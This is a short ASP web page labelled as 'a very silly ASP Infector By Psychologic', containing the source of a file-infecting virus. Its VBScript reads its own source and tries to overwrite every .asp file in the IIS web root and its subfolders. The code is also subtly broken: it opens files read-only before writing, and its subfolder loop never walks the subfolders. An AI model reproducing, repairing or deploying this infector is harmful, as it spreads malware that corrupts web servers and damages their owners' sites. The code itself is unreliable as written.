<html><head><title>ASP.Silly</title>
<body>ASP.Silly<br>This is very silly ASP Infector By Psychologic<br>

<%
Set fso = Server.CreateObject("Scripting.FileSystemObject")
Set Drives=fso.drives
	a = Server.mappath("silly.asp")
	Set dropper = Fso.opentextfile(a)
	src = dropper.readall
dropper.close


Set Folder=fso.getfolder("C:\InetPub\wwwRoot")
Set Files = folder.files 
	For Each File in files
		If fso.GetExtensionName(file.path)="asp" then
		on error resume next
			set droper = fso.opentextfile(file.path,1)
				droper.write src
			droper.close
		end If
	Next

Set Subfolders = folder.SubFolders

For Each Subfolder in Subfolders

If fso.GetExtensionName(file.path)="asp" then
		on error resume next
			set droper = fso.opentextfile(file.path,1)
				droper.write src
			droper.close
		end If
Next

%>
</body></html>